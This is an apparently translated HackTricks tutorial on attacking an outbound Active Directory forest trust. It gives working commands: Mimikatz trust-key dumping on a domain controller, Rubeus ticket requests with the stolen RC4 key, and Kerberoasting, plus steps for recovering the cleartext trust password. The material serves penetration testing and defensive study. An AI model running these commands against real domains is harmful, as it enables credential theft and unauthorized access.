# External Forest Domain - One-Way (Outbound)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

U ovom scenariju **vaš domen** poverava neke **privilegije** principalu iz **drugih domena**.

## Enumeracija

### Izlazno poverenje

```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```

## Napad na nalog poverenja

Postoji bezbednosna ranjivost kada se uspostavi poverenje između dve domene, ovde identifikovane kao domena **A** i domena **B**, gde domen **B** proširuje svoje poverenje na domen **A**. U ovom postavci, poseban nalog se kreira u domenu **A** za domen **B**, koji igra ključnu ulogu u procesu autentifikacije između ove dve domene. Ovaj nalog, povezan sa domenom **B**, se koristi za enkripciju tiketa za pristupanje uslugama između domena.

Ključno je razumeti da se lozinka i heš ovog posebnog naloga mogu izvući sa kontrolera domene u domenu **A** koristeći alatku komandne linije. Komanda za izvršavanje ove akcije je:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```

Ova ekstrakcija je moguća jer je nalog, identifikovan sa **$** nakon svog imena, aktivan i pripada grupi "Domain Users" domena **A**, čime nasleđuje dozvole povezane sa ovom grupom. To omogućava pojedincima da se autentifikuju protiv domena **A** koristeći ovaj nalog.

**Upozorenje:** Moguće je iskoristiti ovu situaciju kako bi se stekao pristup domenu **A** kao korisnik, iako sa ograničenim dozvolama. Međutim, ovaj pristup je dovoljan za izvršavanje enumeracije na domenu **A**.

U scenariju gde je `ext.local` domen koji veruje, a `root.local` je domen koji je poveren, korisnički nalog nazvan `EXT$` bi bio kreiran unutar `root.local`. Kroz određene alate, moguće je izvući Kerberos ključeve poverenja, otkrivajući pristupne podatke za `EXT$` u `root.local`. Komanda za postizanje ovoga je:

```bash
lsadump::trust /patch
```

Nakon toga, moglo bi se koristiti izvučeni RC4 ključ za autentifikaciju kao `root.local\EXT$` unutar `root.local` koristeći drugu naredbu alata:

```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```

Ova autentifikacija otvara mogućnost enumeracije i čak iskorišćavanja usluga unutar `root.local`, kao što je izvođenje Kerberoast napada radi izvlačenja akreditiva servisnih naloga koristeći:

```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```

### Prikupljanje lozinke za poverenje u čistom tekstu

U prethodnom toku korišćen je heš poverenja umesto **lozinke u čistom tekstu** (koja je takođe **izvučena pomoću mimikatz alata**).

Lozinka u čistom tekstu može se dobiti konvertovanjem izlaza \[ CLEAR ] iz mimikatz alata iz heksadecimalnog oblika i uklanjanjem nultih bajtova ‘\x00’:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Ponekad, prilikom uspostavljanja poverenja, korisnik mora uneti lozinku za poverenje. U ovoj demonstraciji, ključ je originalna lozinka za poverenje i stoga je čitljiva za ljude. Kako ključ rotira (svakih 30 dana), lozinka u čistom tekstu neće biti čitljiva za ljude, ali tehnički je i dalje upotrebljiva.

Lozinka u čistom tekstu može se koristiti za obavljanje redovne autentifikacije kao nalog za poverenje, kao alternativa zahtevanju TGT-a korišćenjem tajnog ključa Kerberos naloga za poverenje. Ovde se upituje root.local sa ext.local za članove Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Reference

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Naučite hakovanje AWS-a od početnika do stručnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
